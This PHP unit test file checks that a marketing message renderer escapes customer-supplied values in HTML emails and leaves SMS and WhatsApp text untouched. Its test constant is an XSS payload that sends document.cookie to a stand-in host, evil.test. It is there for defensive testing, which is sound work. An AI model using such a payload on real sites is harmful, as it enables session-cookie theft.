<?php

declare(strict_types=1);

namespace Tests\Unit\Marketing;

use App\Modules\Marketing\Application\Rendering\MessageRenderer;
use App\Modules\Marketing\Domain\Channel;
use App\Modules\Marketing\Domain\VariableMapper;
use PHPUnit\Framework\TestCase;

/**
 * Audience rows carry customer-controlled columns (name, address…). Those values
 * are substituted into an assembled HTML email, the result is PERSISTED on the
 * notification, and the admin panel later displays it — so an unescaped
 * substitution is stored XSS that lands in the admin's origin, where the auth
 * cookie lives. These tests pin the escaping boundary in both directions:
 * escaped in HTML, untouched in plain text.
 */
final class MessageRendererEscapingTest extends TestCase
{
    private const PAYLOAD = '<img src=x onerror="fetch(`https://evil.test/`+document.cookie)">';

    public function test_email_body_escapes_recipient_supplied_values(): void
    {
        $out = MessageRenderer::render(Channel::EMAIL, [
            'subject' => 'Hello {{name}}',
            'html'    => '<p>Hi {{name}}, your order ships soon.</p>',
        ], ['name' => self::PAYLOAD]);

        // What matters is that no TAG and no attribute quoting survives — the
        // string "onerror" remaining as inert text is fine and expected.
        $this->assertStringNotContainsString('<img', $out['body']);
        $this->assertStringNotContainsString('onerror="', $out['body']);
        $this->assertStringContainsString('&lt;img', $out['body']);
        $this->assertStringContainsString('&quot;', $out['body']);
        // The authored template itself must survive — we escape values, not HTML.
        $this->assertStringContainsString('<p>Hi ', $out['body']);
    }

    public function test_email_button_markup_is_preserved_while_values_are_escaped(): void
    {
        $out = MessageRenderer::render(Channel::EMAIL, [
            'subject' => 'Order {{order_number}}',
            'html'    => '<p>{{name}}</p>',
            'buttons' => [['label' => 'Track order', 'url' => 'https://plantathome.in/track']],
        ], ['name' => '<b>Bold</b>', 'order_number' => '123']);

        $this->assertStringContainsString('<a href="https://plantathome.in/track"', $out['body']);
        $this->assertStringContainsString('Track order', $out['body']);
        $this->assertStringNotContainsString('<b>Bold</b>', $out['body']);
        $this->assertStringContainsString('&lt;b&gt;Bold', $out['body']);
    }

    /** SMS/WhatsApp are plain text — escaping there would ship literal &#039;. */
    public function test_plain_text_channels_are_not_html_escaped(): void
    {
        foreach ([Channel::SMS, Channel::WHATSAPP] as $channel) {
            $out = MessageRenderer::render($channel, [
                'body' => 'Hi {{name}}, order {{order_number}} is out.',
            ], ['name' => "Sarah O'Neil & co", 'order_number' => '77']);

            $this->assertSame("Hi Sarah O'Neil & co, order 77 is out.", $out['body']);
            $this->assertStringNotContainsString('&amp;', $out['body']);
            $this->assertStringNotContainsString('&#039;', $out['body']);
        }
    }

    public function test_variable_mapper_defaults_to_not_escaping(): void
    {
        // The default must stay unescaped: plain-text callers rely on it, and an
        // HTML caller has to opt in explicitly so the choice is visible in review.
        $this->assertSame("O'Neil", VariableMapper::render('{{n}}', ['n' => "O'Neil"]));
        $this->assertSame('&#039;', VariableMapper::render('{{n}}', ['n' => "'"], true));
    }
}
